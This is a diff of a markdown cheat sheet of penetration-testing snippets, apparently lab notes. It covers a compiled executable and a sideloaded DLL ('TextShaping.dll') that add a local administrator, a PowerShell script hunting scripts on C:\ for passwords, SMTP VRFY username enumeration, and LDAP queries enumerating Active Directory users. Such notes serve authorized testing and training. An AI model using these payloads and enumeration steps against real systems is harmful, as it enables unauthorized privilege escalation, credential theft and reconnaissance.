@@ -1,16 +1,22 @@
-# 🧰 Mixed Payloads and Enumeration Snippets – Offensive Toolkit Notes
+# Mixed payloads and enumeration snippets
+
+Reference snippets for **authorized** testing: local admin user creation (lab binaries), script content review, SMTP `VRFY`, and lightweight **Active Directory** LDAP queries from PowerShell.
 
 ---
 
-## 🧱 Binary Payload – Create Admin User via EXE
+## Binary payload — add local admin (`adduser.exe`)
 
-### 🛠 Compile
+### Compile (MinGW cross-compile from Linux)
 
 ```bash
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
 
-### 📄 Source (adduser.c)
+**Purpose:** produce a Windows **x64** executable. After execution on a target (e.g. via lateral movement), it runs `net user` / `net localgroup` to add a user and grant **Administrators** membership.
+
+**QC:** Replace usernames/passwords. These commands require **elevated** rights on the Windows host to succeed.
+
+### Source (`adduser.c`)
 
 ```c
 #include <stdlib.h>
@@ -28,15 +34,17 @@ int main ()
 
 ---
 
-## 🧬 DLL Payload – Create Admin User via DLL Injection
+## DLL payload — `DllMain` (`TextShaping.dll`)
 
-### 🛠 Compile
+### Compile as DLL
 
 ```bash
 x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
 ```
 
-### 📄 Source (TextShaping.cpp)
+**Purpose:** `DllMain` runs on `DLL_PROCESS_ATTACH` when the DLL is loaded into a process—useful only in **controlled** DLL sideload / hijack labs.
+
+### Source (`TextShaping.cpp`)
 
 ```cpp
 #include <stdlib.h>
@@ -65,12 +73,12 @@ BOOL APIENTRY DllMain(
 
 ---
 
-## 🔍 PowerShell – Search for Passwords in Scripts
+## PowerShell — search scripts for credential patterns
 
-### 📄 Script: `Search-ScriptsForPasswords.ps1`
+### Script: `Search-ScriptsForPasswords.ps1`
 
 ```powershell
-# Recursively search for password-related strings in script files on C:\
+# Recursively search script extensions on C:\ for common secret keywords
 $OutputFile = "C:\Users\alex\password_search_results.txt"
 Write-Host "Searching for password-related strings..." -ForegroundColor Green
 
@@ -83,24 +91,33 @@ Get-ChildItem -Path C:\ -Recurse -Include *.ps1, *.bat, *.cmd, *.vbs -ErrorActio
 Write-Host "Search completed. Results saved to: $OutputFile" -ForegroundColor Cyan
 ```
 
+**Notes:**
+
+- `-ErrorAction SilentlyContinue` skips permission errors on protected paths.
+- Output is **path:lineNumber:line** for quick triage in a text editor.
+
 ---
 
-## 📨 Python – SMTP VRFY User Enumeration
+## Python — SMTP `VRFY` helper
 
-### 🛠 Usage
+### Usage
 
 ```bash
 python3 smtp.py root 192.168.50.8
 ```
 
-- `root`: user to verify
-- `192.168.50.8`: target SMTP server
+| Argument | Role |
+|----------|------|
+| `root` | Username string sent in `VRFY` |
+| `192.168.50.8` | SMTP server IP |
+
+**QC:** Many servers disable `VRFY` or return misleading codes; interpret results with **manual** `telnet`/`openssl s_client` tests.
 
 ---
 
-## 🏛 PowerShell – PDC Enumeration
+## PowerShell — PDC and LDAP root path
 
-### 🔍 Get PDC Name and LDAP Path
+### Resolve PDC and build `LDAP://` base
 
 ```powershell
 $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
@@ -109,11 +126,11 @@ $LDAP = "LDAP://$PDC/$DN"
 $LDAP
 ```
 
+**Purpose:** `PdcRoleOwner` is the **primary domain controller** FQDN; `distinguishedName` from rootDSE gives the **default naming context** for LDAP binds from a domain-joined host.
+
 ---
 
-## 🧬 PowerShell – AD User Filtering
-
-### 🔍 Enumerate User Objects in AD
+## PowerShell — enumerate user objects (`samAccountType`)
 
 ```powershell
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -137,15 +154,17 @@ Foreach($obj in $result)
 }
 ```
 
+**Note:** `805306368` = **normal user** accounts (`ADS_UF_NORMAL_ACCOUNT`). Adjust filter for groups, computers, etc., per LDAP query documentation.
+
 ---
 
-## ✅ Summary
+## Summary
 
-- **adduser.exe / TextShaping.dll**: Local user creation via binary payloads.
-- **Search-ScriptsForPasswords.ps1**: Credential hunting in Windows scripts.
-- **smtp.py**: SMTP `VRFY`-based username discovery.
-- **AD PowerShell**: LDAP + user object enumeration for red team recon.
+| Snippet | Use case |
+|---------|----------|
+| `adduser.exe` / `TextShaping.dll` | Demonstration of local account creation (lab only) |
+| `Search-ScriptsForPasswords.ps1` | Hunt cleartext or weak patterns in script files |
+| `smtp.py` | SMTP username probing via `VRFY` |
+| AD PowerShell | Resolve PDC and sample user objects over LDAP |
 
-```bash
-# All tools focused on foothold, lateral movement, and privilege escalation.
-```
+Use only where you have **explicit authorization** (lab range, written rules of engagement, or owned infrastructure).
